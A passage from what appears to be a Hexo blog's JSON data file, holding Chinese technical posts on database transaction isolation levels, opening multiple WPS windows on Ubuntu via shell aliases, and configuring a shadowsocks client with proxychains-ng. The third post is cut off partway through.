读已提交(READ COMMITTED)\n\n只能读到其他事务已提交的数据。 \n\n### 3. 可重复读(REPEATABLE READ)\n\n在读已提交的基础上，增加一点，本条事务内，读同一份数据，以该事务第一次读取的数据的备份为标准（即使在此期间其他事务提交了该数据的修改，读到的仍是原数据）。 \n\n### 4. 串行(SERIALIZABLE)\n\n串行执行，该事务不能与其他事务同时操作同一个数据，必须等待操作数据的事务或串行事务提交才能继续运行。Serializable的事务先查询或修改了该条记录，则其他事务对该记录的操作均会被阻塞。 \n\n\n事务隔离会在写数据的时候给数据加上排他锁，而串行事务下读数据的时候也会给数据加上排他锁。 \n\n\n\n## 其他\n\n查看当前事务隔离级别  `SELECT @@TX_ISOLATION`\n\n设置当前事务隔离级别  `SET SESSION TRANSACTION ISOLATION LEVEL read uncommitted / read committed / repeatable read / serializable`\n\nSpring中注解设置 `@Transactional(isolation = Isolation.REPEATABLE_READ)`","slug":"transaction-isolation","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05u000lg0ukhdoj7p68","content":"<h2 id=\"事务的ACID特性\"><a href=\"#事务的ACID特性\" class=\"headerlink\" title=\"事务的ACID特性\"></a>事务的ACID特性</h2><ol>\n<li>原子性 </li>\n<li>一致性（事务处理前后从一个一致性状态变换到另一个一致性状态） </li>\n<li>隔离性（多个并发事务间的隔离） </li>\n<li>持久性 </li>\n</ol>\n<h2 id=\"无隔离处理下的几种问题\"><a href=\"#无隔离处理下的几种问题\" class=\"headerlink\" title=\"无隔离处理下的几种问题\"></a>无隔离处理下的几种问题</h2><h3 id=\"1-脏读\"><a href=\"#1-脏读\" class=\"headerlink\" title=\"1. 脏读\"></a>1. 脏读</h3><p>并发的其中一个事务读取另一个事务未提交的内容，当另一个事务回滚后发现读的是无效数据 </p>\n<h3 id=\"2-不可重复读\"><a href=\"#2-不可重复读\" class=\"headerlink\" title=\"2. 不可重复读\"></a>2. 不可重复读</h3><p>并发的其中一个事务在一开始读取了一次数据，并在另一个事务提交后又读取了一次数据，发现两次读取的数据不一致 </p>\n<h3 id=\"3-幻读（虚读）\"><a href=\"#3-幻读（虚读）\" class=\"headerlink\" title=\"3. 幻读（虚读）\"></a>3. 幻读（虚读）</h3><p>并发的其中一条事务对表内的所有行执行字段a的值从1变为2，这时在另一条事务中在表内添加了另一条a的值为1的数据，前一条事务会发现执行完后，表内仍有a字段值为1的记录 </p>\n<h2 id=\"事务隔离级别\"><a href=\"#事务隔离级别\" class=\"headerlink\" title=\"事务隔离级别\"></a>事务隔离级别</h2><p>针对上述问题，设置了四种事务的隔离级别，由用户根据业务选择使用哪种隔离级别 ，在MySQL中默认是Repeatable Read级别，Oracle中默认是Read Committed级别。</p>\n<h3 id=\"1-读未提交-READ-UNCOMMITTED\"><a href=\"#1-读未提交-READ-UNCOMMITTED\" class=\"headerlink\" title=\"1. 读未提交(READ UNCOMMITTED)\"></a>1. 读未提交(READ UNCOMMITTED)</h3><p>可以读到其他事务未提交的数据。 </p>\n<h3 id=\"2-读已提交-READ-COMMITTED\"><a href=\"#2-读已提交-READ-COMMITTED\" class=\"headerlink\" title=\"2. 读已提交(READ COMMITTED)\"></a>2. 读已提交(READ COMMITTED)</h3><p>只能读到其他事务已提交的数据。 </p>\n<h3 id=\"3-可重复读-REPEATABLE-READ\"><a href=\"#3-可重复读-REPEATABLE-READ\" class=\"headerlink\" title=\"3. 可重复读(REPEATABLE READ)\"></a>3. 可重复读(REPEATABLE READ)</h3><p>在读已提交的基础上，增加一点，本条事务内，读同一份数据，以该事务第一次读取的数据的备份为标准（即使在此期间其他事务提交了该数据的修改，读到的仍是原数据）。 </p>\n<h3 id=\"4-串行-SERIALIZABLE\"><a href=\"#4-串行-SERIALIZABLE\" class=\"headerlink\" title=\"4. 串行(SERIALIZABLE)\"></a>4. 串行(SERIALIZABLE)</h3><p>串行执行，该事务不能与其他事务同时操作同一个数据，必须等待操作数据的事务或串行事务提交才能继续运行。Serializable的事务先查询或修改了该条记录，则其他事务对该记录的操作均会被阻塞。 </p>\n<p>事务隔离会在写数据的时候给数据加上排他锁，而串行事务下读数据的时候也会给数据加上排他锁。 </p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>查看当前事务隔离级别  <code>SELECT @@TX_ISOLATION</code></p>\n<p>设置当前事务隔离级别  <code>SET SESSION TRANSACTION ISOLATION LEVEL read uncommitted / read committed / repeatable read / serializable</code></p>\n<p>Spring中注解设置 <code>@Transactional(isolation = Isolation.REPEATABLE_READ)</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"事务的ACID特性\"><a href=\"#事务的ACID特性\" class=\"headerlink\" title=\"事务的ACID特性\"></a>事务的ACID特性</h2><ol>\n<li>原子性 </li>\n<li>一致性（事务处理前后从一个一致性状态变换到另一个一致性状态） </li>\n<li>隔离性（多个并发事务间的隔离） </li>\n<li>持久性 </li>\n</ol>\n<h2 id=\"无隔离处理下的几种问题\"><a href=\"#无隔离处理下的几种问题\" class=\"headerlink\" title=\"无隔离处理下的几种问题\"></a>无隔离处理下的几种问题</h2><h3 id=\"1-脏读\"><a href=\"#1-脏读\" class=\"headerlink\" title=\"1. 脏读\"></a>1. 脏读</h3><p>并发的其中一个事务读取另一个事务未提交的内容，当另一个事务回滚后发现读的是无效数据 </p>\n<h3 id=\"2-不可重复读\"><a href=\"#2-不可重复读\" class=\"headerlink\" title=\"2. 不可重复读\"></a>2. 不可重复读</h3><p>并发的其中一个事务在一开始读取了一次数据，并在另一个事务提交后又读取了一次数据，发现两次读取的数据不一致 </p>\n<h3 id=\"3-幻读（虚读）\"><a href=\"#3-幻读（虚读）\" class=\"headerlink\" title=\"3. 幻读（虚读）\"></a>3. 幻读（虚读）</h3><p>并发的其中一条事务对表内的所有行执行字段a的值从1变为2，这时在另一条事务中在表内添加了另一条a的值为1的数据，前一条事务会发现执行完后，表内仍有a字段值为1的记录 </p>\n<h2 id=\"事务隔离级别\"><a href=\"#事务隔离级别\" class=\"headerlink\" title=\"事务隔离级别\"></a>事务隔离级别</h2><p>针对上述问题，设置了四种事务的隔离级别，由用户根据业务选择使用哪种隔离级别 ，在MySQL中默认是Repeatable Read级别，Oracle中默认是Read Committed级别。</p>\n<h3 id=\"1-读未提交-READ-UNCOMMITTED\"><a href=\"#1-读未提交-READ-UNCOMMITTED\" class=\"headerlink\" title=\"1. 读未提交(READ UNCOMMITTED)\"></a>1. 读未提交(READ UNCOMMITTED)</h3><p>可以读到其他事务未提交的数据。 </p>\n<h3 id=\"2-读已提交-READ-COMMITTED\"><a href=\"#2-读已提交-READ-COMMITTED\" class=\"headerlink\" title=\"2. 读已提交(READ COMMITTED)\"></a>2. 读已提交(READ COMMITTED)</h3><p>只能读到其他事务已提交的数据。 </p>\n<h3 id=\"3-可重复读-REPEATABLE-READ\"><a href=\"#3-可重复读-REPEATABLE-READ\" class=\"headerlink\" title=\"3. 可重复读(REPEATABLE READ)\"></a>3. 可重复读(REPEATABLE READ)</h3><p>在读已提交的基础上，增加一点，本条事务内，读同一份数据，以该事务第一次读取的数据的备份为标准（即使在此期间其他事务提交了该数据的修改，读到的仍是原数据）。 </p>\n<h3 id=\"4-串行-SERIALIZABLE\"><a href=\"#4-串行-SERIALIZABLE\" class=\"headerlink\" title=\"4. 串行(SERIALIZABLE)\"></a>4. 串行(SERIALIZABLE)</h3><p>串行执行，该事务不能与其他事务同时操作同一个数据，必须等待操作数据的事务或串行事务提交才能继续运行。Serializable的事务先查询或修改了该条记录，则其他事务对该记录的操作均会被阻塞。 </p>\n<p>事务隔离会在写数据的时候给数据加上排他锁，而串行事务下读数据的时候也会给数据加上排他锁。 </p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>查看当前事务隔离级别  <code>SELECT @@TX_ISOLATION</code></p>\n<p>设置当前事务隔离级别  <code>SET SESSION TRANSACTION ISOLATION LEVEL read uncommitted / read committed / repeatable read / serializable</code></p>\n<p>Spring中注解设置 <code>@Transactional(isolation = Isolation.REPEATABLE_READ)</code></p>\n"},{"title":"Ubuntu下wps开多个窗口（不是标签页）的方法","date":"2018-06-09T03:27:38.000Z","keywords":"ubuntu, wps, 多窗口","rId":"MB-18060901","_content":"\n\n## 方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\n\n左上角按钮 -> 进入选项 -> 勾选 在任务栏中显示所有按钮选择框 -> 最后确定\n\n该方案缺点是单个窗口只能开一个标签页\n\n## 方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\n\nword文档：`nohup /opt/kingsoft/wps-office/office6/wps -multiply > /dev/null 2>&1 &`\nexcel文档：`nohup /opt/kingsoft/wps-office/office6/et -multiply > /dev/null 2>&1 &`\nppt文档：`nohup /opt/kingsoft/wps-office/office6/wpp -multiply > /dev/null 2>&1 &`\n\n为了方便以后使用，可以将命令加入.bashrc文件（注意最后是两个大于号，漏写一个会出大问题，建议复制粘贴）\n```\necho alias wps-word='nohup /opt/kingsoft/wps-office/office6/wps -multiply > /dev/null 2>&1 &' >> ~/.bashrc\necho alias wps-excel='nohup /opt/kingsoft/wps-office/office6/et -multiply > /dev/null 2>&1 &' >> ~/.bashrc\necho alias wps-ppt='nohup /opt/kingsoft/wps-office/office6/wpp -multiply > /dev/null 2>&1 &' >> ~/.bashrc\n```\n使当前命令行及机器上.bashrc生效需执行，否则重启后生效\n`source ~/.bashrc`\n\n下次直接在命令行中使用\n`wps-word`、`wps-excel`、`wps-ppt`命令即可\n\n该方案缺点是操作麻烦\n","source":"_posts/2018-06-09_ubuntu_wps.md","raw":"---\ntitle: Ubuntu下wps开多个窗口（不是标签页）的方法\ndate: 2018-06-09 11:27:38\ntags: linux\npermalink: ubuntu-wps\nkeywords: ubuntu, wps, 多窗口\nrId: MB-18060901\n---\n\n\n## 方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\n\n左上角按钮 -> 进入选项 -> 勾选 在任务栏中显示所有按钮选择框 -> 最后确定\n\n该方案缺点是单个窗口只能开一个标签页\n\n## 方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\n\nword文档：`nohup /opt/kingsoft/wps-office/office6/wps -multiply > /dev/null 2>&1 &`\nexcel文档：`nohup /opt/kingsoft/wps-office/office6/et -multiply > /dev/null 2>&1 &`\nppt文档：`nohup /opt/kingsoft/wps-office/office6/wpp -multiply > /dev/null 2>&1 &`\n\n为了方便以后使用，可以将命令加入.bashrc文件（注意最后是两个大于号，漏写一个会出大问题，建议复制粘贴）\n```\necho alias wps-word='nohup /opt/kingsoft/wps-office/office6/wps -multiply > /dev/null 2>&1 &' >> ~/.bashrc\necho alias wps-excel='nohup /opt/kingsoft/wps-office/office6/et -multiply > /dev/null 2>&1 &' >> ~/.bashrc\necho alias wps-ppt='nohup /opt/kingsoft/wps-office/office6/wpp -multiply > /dev/null 2>&1 &' >> ~/.bashrc\n```\n使当前命令行及机器上.bashrc生效需执行，否则重启后生效\n`source ~/.bashrc`\n\n下次直接在命令行中使用\n`wps-word`、`wps-excel`、`wps-ppt`命令即可\n\n该方案缺点是操作麻烦\n","slug":"ubuntu-wps","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05v000ng0ukqfs107r1","content":"<h2 id=\"方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\"><a href=\"#方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\" class=\"headerlink\" title=\"方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\"></a>方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案</h2><p>左上角按钮 -&gt; 进入选项 -&gt; 勾选 在任务栏中显示所有按钮选择框 -&gt; 最后确定</p>\n<p>该方案缺点是单个窗口只能开一个标签页</p>\n<h2 id=\"方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\"><a href=\"#方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\" class=\"headerlink\" title=\"方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\"></a>方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）</h2><p>word文档：<code>nohup /opt/kingsoft/wps-office/office6/wps -multiply &gt; /dev/null 2&gt;&amp;1 &amp;</code><br>excel文档：<code>nohup /opt/kingsoft/wps-office/office6/et -multiply &gt; /dev/null 2&gt;&amp;1 &amp;</code><br>ppt文档：<code>nohup /opt/kingsoft/wps-office/office6/wpp -multiply &gt; /dev/null 2&gt;&amp;1 &amp;</code></p>\n<p>为了方便以后使用，可以将命令加入.bashrc文件（注意最后是两个大于号，漏写一个会出大问题，建议复制粘贴）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo alias wps-word=&apos;nohup /opt/kingsoft/wps-office/office6/wps -multiply &gt; /dev/null 2&gt;&amp;1 &amp;&apos; &gt;&gt; ~/.bashrc</span><br><span class=\"line\">echo alias wps-excel=&apos;nohup /opt/kingsoft/wps-office/office6/et -multiply &gt; /dev/null 2&gt;&amp;1 &amp;&apos; &gt;&gt; ~/.bashrc</span><br><span class=\"line\">echo alias wps-ppt=&apos;nohup /opt/kingsoft/wps-office/office6/wpp -multiply &gt; /dev/null 2&gt;&amp;1 &amp;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>使当前命令行及机器上.bashrc生效需执行，否则重启后生效<br><code>source ~/.bashrc</code></p>\n<p>下次直接在命令行中使用<br><code>wps-word</code>、<code>wps-excel</code>、<code>wps-ppt</code>命令即可</p>\n<p>该方案缺点是操作麻烦</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\"><a href=\"#方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\" class=\"headerlink\" title=\"方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案\"></a>方案一、如果没有既要开多个窗口，又要单个窗口开多个标签页的需求的话，可以采用该方案</h2><p>左上角按钮 -&gt; 进入选项 -&gt; 勾选 在任务栏中显示所有按钮选择框 -&gt; 最后确定</p>\n<p>该方案缺点是单个窗口只能开一个标签页</p>\n<h2 id=\"方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\"><a href=\"#方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\" class=\"headerlink\" title=\"方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）\"></a>方案二、使用命令行启动一个空的wps界面，之后再在界面上打开文件（利用在命令中加上-multiply参数的方法）</h2><p>word文档：<code>nohup /opt/kingsoft/wps-office/office6/wps -multiply &gt; /dev/null 2&gt;&amp;1 &amp;</code><br>excel文档：<code>nohup /opt/kingsoft/wps-office/office6/et -multiply &gt; /dev/null 2&gt;&amp;1 &amp;</code><br>ppt文档：<code>nohup /opt/kingsoft/wps-office/office6/wpp -multiply &gt; /dev/null 2&gt;&amp;1 &amp;</code></p>\n<p>为了方便以后使用，可以将命令加入.bashrc文件（注意最后是两个大于号，漏写一个会出大问题，建议复制粘贴）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo alias wps-word=&apos;nohup /opt/kingsoft/wps-office/office6/wps -multiply &gt; /dev/null 2&gt;&amp;1 &amp;&apos; &gt;&gt; ~/.bashrc</span><br><span class=\"line\">echo alias wps-excel=&apos;nohup /opt/kingsoft/wps-office/office6/et -multiply &gt; /dev/null 2&gt;&amp;1 &amp;&apos; &gt;&gt; ~/.bashrc</span><br><span class=\"line\">echo alias wps-ppt=&apos;nohup /opt/kingsoft/wps-office/office6/wpp -multiply &gt; /dev/null 2&gt;&amp;1 &amp;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>使当前命令行及机器上.bashrc生效需执行，否则重启后生效<br><code>source ~/.bashrc</code></p>\n<p>下次直接在命令行中使用<br><code>wps-word</code>、<code>wps-excel</code>、<code>wps-ppt</code>命令即可</p>\n<p>该方案缺点是操作麻烦</p>\n"},{"title":"Ubuntu shadowsocks 客户端代理记录（本地端用ubuntu setting替代chrome浏览器插件）","date":"2018-09-07T15:44:29.000Z","keywords":null,"rId":"MB-18090701","shadow":true,"_content":"\n基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步  \nWindows系统的话，已经有现成的软件（[Windows系统客户端](https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip)），该教程也就没有意义了  \n\n## 安装\n-----------\n\n* sudo apt-get update\n* sudo apt-get install python-pip\n* sudo apt-get install shadowsocks\n* sudo vim /etc/shadowsocks.json\n\n输入以下内容后保存\n\n>\n> {\n>     \"server\":\"xx.xx.xx.xx\", // 远程服务器地址\n>     \"server_port\":xxxx, // 远程服务器端口\n>     \"local_address\": \"127.0.0.1\", // 本机地址\n>     \"local_port\":1080, // 本机用于代理的端口\n>     \"password\":\"xxxxx\", // 密码\n>     \"timeout\":300, // 超时\n>     \"method\":\"aes-256-cfb\", // 加密方式\n>     \"fast_open\": true,\n>     \"workers\": 1\n> }\n\nsudo sslocal -c /etc/shadowsocks.json -d start      启动服务（以后可以通过这个命令启动socks服务）\n\n## chrome浏览器代理\n-----------\n\n打开操作系统的设置 -> 网络 -> 网络代理，选择手动代理，只需填两行，Socks主机：127.0.0.1  1080，忽略主机：localhost, 127.0.0.0/8, ::1，忽略主机项表示不经过代理的网站，还可以逗号补上不想被代理的地址，如：www.baidu.com等。这时浏览器就能通过代理加速访问需要访问的网站。\n\n## 命令行终端代理\n-----------\n\n前面的设置下，命令行终端并没有经过代理。需要经过以下步骤进行：\n\n* git clone https://github.com/rofl0r/proxychains-ng.git\n* cd proxychains-ng\n* ./configure\n* make\n* sudo make install\n* sudo cp ./src/proxychains.conf /etc/proxychains.conf\n* cd .. && rm -rf proxychains-ng       (根据需要选择删除原来的安装源码)\n* sudo vim /etc/proxychains.conf       修改最后一行为：socks5  127.0.0.1 1080\n\n这时候，命令行终端如果需要经过代理，可以在命令前面添加：sudo proxychains4 指令，如果不想输出proxychains的日志信息可以使用：sudo proxychains4 -q，如：\n\n> 添加docker ppa时，由于网络问题，原来的命令\n> sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"\n> 不能成功执行，这时命令修改成：\n> sudo proxychains4 add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"\n> 使得该命令的网络经过代理，可以成功完成\n>\n> 还可以：\n> sudo proxychains4 ping www.docker.com\n> sudo proxychains4 apt-get update\n> sudo proxychains4 -q apt-cache madison mysql-server       (-q 安静模式，不输出proxychains4的日志)\n> sudo proxychains4 apt-get install mysql-server\n\n\n参考自：https://blog.csdn.net/lee_j_r/article/details/54019691\n主要不同点： chrome浏览器代理（修改理由：在没有代理之前，不能打开插件市场安装管理插件，因此修改了代理方式）\n\n","source":"_posts/2018-09-07_shadowsocks.md","raw":"---\ntitle: Ubuntu shadowsocks 客户端代理记录（本地端用ubuntu setting替代chrome浏览器插件）\ndate: 2018-09-07 23:44:29\ntags: linux\npermalink: shadowsocks\nkeywords: \nrId: MB-18090701\nshadow: true\n---\n\n基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步  \nWindows系统的话，已经有现成的软件（[Windows系统客户端](https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip)），该教程也就没有意义了  \n\n## 安装\n-----------\n\n* sudo apt-get update\n* sudo apt-get install python-pip\n* sudo apt-get install shadowsocks\n* sudo vim /etc/shadowsocks.json\n\n输入以下内容后保存\n\n>\n> {\n>     \"server\":\"xx.xx.xx.xx\", // 远程服务器地址\n>     \"server_port\":xxxx, // 远程服务器端口\n>     \"local_address\": \"127.0.0.1\", // 本机地址\n>     \"local_port\":1080, // 本机用于代理的端口\n>     \"password\":\"xxxxx\", // 密码\n>     \"timeout\":300, // 超时\n>     \"method\":\"aes-256-cfb\", // 加密方式\n>     \"fast_open\": true,\n>     \"workers\": 1\n> }\n\nsudo sslocal -c /etc/shadowsocks.json -d start      启动服务（以后可以通过这个命令启动socks服务）\n\n## chrome浏览器代理\n-----------\n\n打开操作系统的设置 -> 网络 -> 网络代理，选择手动代理，只需填两行，Socks主机：127.0.0.1  1080，忽略主机：localhost, 127.0.0.0/8, ::1，忽略主机项表示不经过代理的网站，还可以逗号补上不想被代理的地址，如：www.baidu.com等。这时浏览器就能通过代理加速访问需要访问的网站。\n\n## 命令行终端代理\n-----------\n\n前面的设置下，命令行终端并没有经过代理。需要经过以下步骤进行：\n\n* git clone https://github.com/rofl0r/proxychains-ng.git\n* cd proxychains-ng\n* ./configure\n* make\n* sudo make install\n* sudo cp ./src/proxychains.conf /etc/proxychains.conf\n* cd .. && rm -rf proxychains-ng       (根据需要选择删除原来的安装源码)\n* sudo vim /etc/proxychains.conf       修改最后一行为：socks5  127.0.0.1 1080\n\n这时候，命令行终端如果需要经过代理，可以在命令前面添加：sudo proxychains4 指令，如果不想输出proxychains的日志信息可以使用：sudo proxychains4 -q，如：\n\n> 添加docker ppa时，由于网络问题，原来的命令\n> sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"\n> 不能成功执行，这时命令修改成：\n> sudo proxychains4 add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"\n> 使得该命令的网络经过代理，可以成功完成\n>\n> 还可以：\n> sudo proxychains4 ping www.docker.com\n> sudo proxychains4 apt-get update\n> sudo proxychains4 -q apt-cache madison mysql-server       (-q 安静模式，不输出proxychains4的日志)\n> sudo proxychains4 apt-get install mysql-server\n\n\n参考自：https://blog.csdn.net/lee_j_r/article/details/54019691\n主要不同点： chrome浏览器代理（修改理由：在没有代理之前，不能打开插件市场安装管理插件，因此修改了代理方式）\n\n","slug":"shadowsocks","published":1,"updated":"2020-01-25T11:26:02.448Z","_id":"ck5qhi05x000qg0ukum9thxpz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步<br>Windows系统的话，已经有现成的软件（<a href=\"https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip\" target=\"_blank\" rel=\"noopener\">Windows系统客户端</a>），该教程也就没有意义了  </p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><hr>\n<ul>\n<li>sudo apt-get update</li>\n<li>sudo apt-get install python-pip</li>\n<li>sudo apt-get install shadowsocks</li>\n<li>sudo vim /etc/shadowsocks.json</li>\n</ul>\n<p>输入以下内容后保存</p>\n<blockquote>\n<p>{<br>    “server”:”xx.xx.xx.xx”, // 远程服务器地址<br>    “server_port”:xxxx, // 远程服务器端口<br>    “local_address”: “127.0.0.1”, // 本机地址<br>    “local_port”:1080, // 本机用于代理的端口<br>    “password”:”xxxxx”, // 密码<br>    “timeout”:300, // 超时<br>    “method”:”aes-256-cfb”, // 加密方式<br>    “fast_open”: true,<br>    “workers”: 1<br>}</p>\n</blockquote>\n<p>sudo sslocal -c /etc/shadowsocks.json -d start      启动服务（以后可以通过这个命令启动socks服务）</p>\n<h2 id=\"chrome浏览器代理\"><a href=\"#chrome浏览器代理\" class=\"headerlink\" title=\"chrome浏览器代理\"></a>chrome浏览器代理</h2><hr>\n<p>打开操作系统的设置 -&gt; 网络 -&gt; 网络代理，选择手动代理，只需填两行，Socks主机：127.0.0.1  1080，忽略主机：localhost, 127.0.0.0/8, ::1，忽略主机项表示不经过代理的网站，还可以逗号补上不想被代理的地址，如：<a href=\"http://www.baidu.com等。这时浏览器就能通过代理加速访问需要访问的网站。\" target=\"_blank\" rel=\"noopener\">www.baidu.com等。这时浏览器就能通过代理加速访问需要访问的网站。</a></p>\n<h2 id=\"命令行终端代理\"><a href=\"#命令行终端代理\" class=\"headerlink\" title=\"命令行终端代理\"></a>命令行终端代理</h2><hr>\n<p>前面的设置下，命令行终端并没有经过代理。需要经过以下步骤进行：</p>\n<ul>\n<li>git clone <a href=\"https://github.com/rofl0r/proxychains-ng.git\" target=\"_blank\" rel=\"noopener\">https://github.com/rofl0r/proxychains-ng.git</a></li>\n<li>cd proxychains-ng</li>\n<li>./configure</li>\n<li>make</li>\n<li>sudo make install</li>\n<li>sudo cp ./src/proxychains.conf /etc/proxychains.conf</li>\n<li>cd .. &amp;&amp; rm -rf proxychains-ng       (根据需要选择删除原来的安装源码)</li>\n<li>sudo vim /etc/proxychains.conf       修改最后一行为：socks5  127.0.0.1 1080</li>\n</ul>\n<p>这时候，命令行终端如果需要经过代理，可以在命令前面添加：sudo proxychains4 指令，如果不想输出proxychains的日志信息可以使用：sudo proxychains4 -q，如：</p>\n<blockquote>\n<p>添加docker ppa时，由于网络问题，原来的命令<br>sudo add-apt-repository “deb [arch=amd64] <a href=\"https://download.docker.com/linux/ubuntu\" target=\"_blank\" rel=\"noopener\">https://download.docker.com/linux/ubuntu</a> $(lsb_release -cs) stable”<br>不能成功执行，这时命令修改成：<br>sudo proxychains4 add-apt-repository “deb [arch=amd64] <a href=\"https://download.docker.com/linux/ubuntu\" target=\"_blank\" rel=\"noopener\">https://download.docker.com/linux/ubuntu</a> $(lsb_release -cs) stable”<br>使得该命令的网络经过代理，可以成功完成</p>\n<p>还可以：<br>sudo proxychains4 ping <a href=\"http://www.docker.com\" target=\"_blank\" rel=\"noopener\">www.docker.com</a><br>sudo proxychains4 apt-get update<br>sudo proxychains4 -q apt-cache madison mysql-server       (-q 安静模式，不输出proxychains4的日志)<br>sudo proxychains4 apt-get install mysql-server</p>\n</blockquote>\n<p>参考自：<a href=\"https://blog.csdn.net/lee_j_r/article/details/54019691\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/lee_j_r/article/details/54019691</a><br>主要不同点： chrome浏览器代理（修改理由：在没有代理之前，不能打开插件市场安装管理插件，因此修改了代理方式）</p>\n","site":{"data":{}},"excerpt":"","more":"<p>基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步<br>Windows系统的话，已经有现成的软件（<a href=\"https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip\" target=\"_blank\" rel=\"noopener\">Windows系统客户端</a>），该教程也就没有意义了  </p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><hr>\n<ul>\n<li>sudo apt-get update</li>\n<li>sudo apt-get install python-pip</li>\n<li>sudo apt-get install shadowsocks</li>\n<li>sudo vim /etc/shadowsocks.json</li>\n</ul>\n<p>输入以下内容后保存</p>\n<blockquote>\n<p>{<br>    “server”:”xx.xx.xx.xx”, // 远程服务器地址<br>    “server_port”:xxxx, // 远程服务器端口<br>    “local_address”: “127.0.0.1”, // 本机地址<br>    “local_port”:1080, // 本机用于代理的端口<br>    “password”:”xxxxx”, // 密码<br>    “timeout”:300, // 超时<br>    “method”:”aes-256-cfb”, // 加密方式<br>    “fast_open”: true,<br>    “workers”: 1<br>}</p>\n</blockquote>\n<p>sudo sslocal -c /etc/shadowsocks.json -d start      启动服务（以后可以通过这个命令启动socks服务）</p>\n<h2 id=\"chrome浏览器代理\"><a href=\"#chrome浏览器代理\" class=\"headerlink\" title=\"chrome浏览器代理\"></a>chrome浏览器代理</h2><hr>\n<p>打开操作系统的设置 -&gt; 网络 -&gt; 网络代理，选择手动代理，只需填两行，Socks主机：127.0.0.1  1080，忽略主机：localhost, 127.0.0.0/8, ::1，忽略主机项表示不经过代理的网站，还可以逗号补上不想被代理的地址，如：<a href=\"http://www.baidu.com等。这时浏览器就能通过代理加速访问需要访问的网站。\" target=\"_blank\" rel=\"noopener\">www.baidu.com等。这时浏览器就能通过代理加速访问需要访问的网站。</a></p>\n<h2 id=\"命令行终端代理\"><a href=\"#命令行终端代理\" class=\"headerlink\" title=\"命令行终端代理\"></a>命令行终端代理</h2><hr>\n<p>前面的设置下，命令行终端并没有经过代理。需要经过以下步骤进行：</p>\n<ul>\n<li>git clone <a href=\"https://github.com/rofl0r/proxychains-ng.git\" target=\"_blank\" rel=\"noopener\">https://github.com/rofl0r/proxychains-ng.git</a></li>\n<li>cd proxychains-ng</li>\n<li>./configure</li>\n<li>make</li>\n<li>sudo make install</li>\n<li>sudo cp ./src/proxychains.conf /etc/proxychains.conf</li>\n<li>cd .. &amp;&amp; rm -rf proxychains-ng       (根据需要选择删除原来的安装源码)</li>\n<li>sudo vim /etc/proxychains.conf       修改最后一行为：socks5  127.0.0.1 1080</li>\n</ul>\n<p>这时候，命令行终端如果需要经过代理，可以在命令前面添加：sudo proxychains4 指令，如果不想输出proxychains的日志信息可以使用：sudo proxychains4 